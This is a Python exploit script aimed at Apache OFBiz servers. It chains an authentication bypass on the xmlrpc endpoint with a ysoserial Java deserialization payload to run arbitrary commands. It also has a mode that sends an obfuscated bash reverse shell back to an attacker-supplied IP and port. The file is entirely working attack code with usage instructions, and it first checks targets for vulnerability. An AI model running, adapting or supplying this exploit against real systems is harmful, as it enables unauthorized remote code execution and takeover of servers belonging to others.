import base64
import os
import requests
import subprocess
import sys
import urllib3

usage_msg = """Usage: 
python3 ofbiz_exploit.py target_URL rce command
python3 ofbiz_exploit.py target_URL shell IP:PORT
"""
auth_bypass = "webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y"
ping_test = "webtools/control/ping;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y"
headers = {'Content-Type': 'application/xml'}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_revshell(ip, port):
    rev_shell_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    encoded_rev_shell_command = base64.b64encode(rev_shell_command.encode()).decode()
    return f'bash -c echo${{IFS}}{encoded_rev_shell_command}|base64${{IFS}}-d|bash'


def generate_xml_payload(arg):
    payload = subprocess.check_output(["java", "-jar", "ysoserial-all.jar", "CommonsBeanutils1", arg])
    base64_payload = base64.b64encode(payload).decode()

    return f"""<?xml version="1.0"?>
    <methodCall>
        <methodName>RCE-Test</methodName>
        <params>
            <param>
                <value>
                    <struct>
                        <member>
                            <name>rce</name>
                            <value>
                                <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                                {base64_payload}
                                </serializable>
                            </value>
                        </member>
                    </struct>
                </value>
            </param>
        </params>
    </methodCall>
    """


def rce(url, arg):
    try:
        xml_data = generate_xml_payload(arg)
        r = requests.post(url + auth_bypass, data=xml_data, headers=headers, verify=False)
        if "java.lang.reflect.InvocationTargetException" in r.text:
            print("[+] Exploit completed. [+]")
        else:
            print("[?] It is not possible to be certain of success. The target may not be truly vulnerable. [?]\n"
                  "Check if the reverse shell was established or if there is any command output.")
    except subprocess.CalledProcessError:
        sys.exit("""
        Error. Try changing your current Java version to Java 11: \nsudo apt-get install openjdk-11-jdk
        \nsudo update-alternatives --config java
        """)
    except Exception as e:
        sys.exit(f"Error: {e}")


def shell(url, arg):
    try:
        ip, port = arg.split(":")
        rev_shell_payload = generate_revshell(ip, port)
        rce(url, rev_shell_payload)
    except ValueError:
        sys.exit("Invalid argument. Please use the format IP:PORT.")
    except Exception as e:
        sys.exit(f"Error: {e}")


def main(target_url, action, arg):
    if not os.path.exists("ysoserial-all.jar"):
        sys.exit("Aborting. The ysoserial-all.jar file needs to be in the same directory as the exploit code.")

    target_url = target_url.rstrip("/") + "/"

    if not target_url.startswith(("http://", "https://")):
        sys.exit("""Please enter a valid URL.\nExample: https://targeturl.com""")

    if action == "rce":
        rce(target_url, arg)
    elif action == "shell":
        shell(target_url, arg)
    else:
        sys.exit(usage_msg)


def check_vuln(target_url):
    target_url = target_url.rstrip("/") + "/"

    try:
        response = requests.post(target_url + ping_test, headers=headers, verify=False)

        if "PONG" in response.text:
            print("The target appears to be vulnerable.")
            return True
        else:
            print("The target does not appear to be vulnerable")
            return False
    except requests.RequestException as e:
        sys.exit(f"Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(usage_msg)

    target_url, action, arg = sys.argv[1:4]

    if check_vuln(target_url):
        main(target_url, action, arg)
